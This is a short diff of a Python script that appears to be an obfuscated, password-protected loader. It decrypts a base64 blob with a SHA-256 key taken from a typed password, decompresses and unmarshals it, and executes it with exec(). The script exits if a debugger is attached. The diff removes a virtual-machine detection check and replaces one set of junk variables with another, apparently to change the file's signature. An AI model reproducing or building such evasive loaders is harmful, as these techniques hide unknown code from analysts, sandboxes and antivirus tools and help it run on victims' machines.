@@ -13,14 +13,6 @@ if sys.gettrace():
     sys.exit()
 
 
-import platform
-vm_signs = ["VBOX","VMWARE","QEMU"]
-info = platform.platform().upper()
-for v in vm_signs:
-    if v in info:
-        print("[-] Virtual Machine detected")
-        sys.exit()
-
 
 pwd = input("Password: ")
 key = hashlib.sha256(pwd.encode()).digest()
@@ -29,13 +21,13 @@ data = b'9PXDnt4RGEIrjzZX3Bu3dcnkqV3jbB4q0DykSvSugEGaoTtnkE52wqu8AZfmRtfoAuNpHv+
 
 raw = bytes(b ^ key[i % len(key)] for i,b in enumerate(base64.b64decode(data)))
 
-_x6178=9952
-_x7147=6861
-_x5209=8417
-_x3785=3694
-_x5231=1778
-_x1179=3972
-_x1519=698
-_x2503=9004
+_x8785=6430
+_x9508=502
+_x5097=4434
+_x9785=127
+_x6170=1274
+_x9259=3438
+_x2156=9817
+_x8038=3404
 
 exec(marshal.loads(zlib.decompress(raw)))
